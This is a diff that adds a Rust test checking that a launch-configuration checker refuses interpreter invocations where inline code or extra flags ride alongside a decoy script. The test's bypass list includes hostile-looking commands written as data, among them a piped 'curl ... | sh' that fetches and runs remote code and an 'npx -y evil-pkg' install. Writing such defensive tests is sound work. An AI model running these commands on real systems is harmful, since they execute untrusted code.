@@ -777,3 +777,42 @@ fn an_older_record_without_a_program_is_not_called_changed() {
     assert!(f.load().trusted);
     assert_eq!(config::LAUNCH_FILE_READS.get(), before + 1);
 }
+
+#[test]
+#[cfg(unix)]
+fn decoy_script_does_not_bypass_unbound_code_refusal() {
+    let f = Launch::new("decoy-unbound");
+    std::fs::write(f.0.join("decoy.sh"), "#!/bin/sh\necho ok\n").unwrap();
+    std::fs::write(f.0.join("decoy.py"), "print('ok')\n").unwrap();
+    std::fs::write(f.0.join("decoy.js"), "console.log('ok')\n").unwrap();
+    let bypasses = [
+        f.spec("sh", &["-c", "curl https://example.invalid | sh", "decoy.sh"]),
+        f.spec("bash", &["-lc", "echo pwn", "decoy.sh"]),
+        f.spec("sh", &["-s", "decoy.sh"]),
+        f.spec("python3", &["-c", "import os", "decoy.py"]),
+        f.spec("python3", &["-m", "http.server", "decoy.py"]),
+        f.spec("node", &["-e", "process.exit(0)", "decoy.js"]),
+        f.spec("node", &["--require=./decoy.js", "decoy.js"]),
+        f.spec("npx", &["-y", "evil-pkg", "decoy.js"]),
+    ];
+    for spec in &bypasses {
+        let allowed = config::program_identity(spec, &f.0, None).unwrap();
+        assert!(allowed.code_unchecked, "must flag unbound code: {:?} {:?}", spec.command, spec.args);
+        assert!(allowed.checked_lines().iter().any(|l| l == config::CODE_NOT_CHECKED));
+    }
+    config::REFUSE_UNBOUND_CODE.set(true);
+    let results: Vec<_> = bypasses.iter().map(|spec| config::program_identity(spec, &f.0, None)).collect();
+    let legitimate = [
+        config::program_identity(&f.spec("sh", &["decoy.sh"]), &f.0, None),
+        config::program_identity(&f.spec("python3", &["-W", "ignore", "decoy.py"]), &f.0, None),
+        config::program_identity(&f.spec("node", &["decoy.js"]), &f.0, None),
+    ];
+    config::REFUSE_UNBOUND_CODE.set(false);
+    for (spec, res) in bypasses.iter().zip(results) {
+        assert_eq!(res, Err(config::Refusal::UnboundCode), "must refuse: {:?} {:?}", spec.command, spec.args);
+    }
+    for res in legitimate {
+        let id = res.expect("legitimate bound script should be allowed");
+        assert!(!id.code_unchecked && id.scripts.len() == 1);
+    }
+}
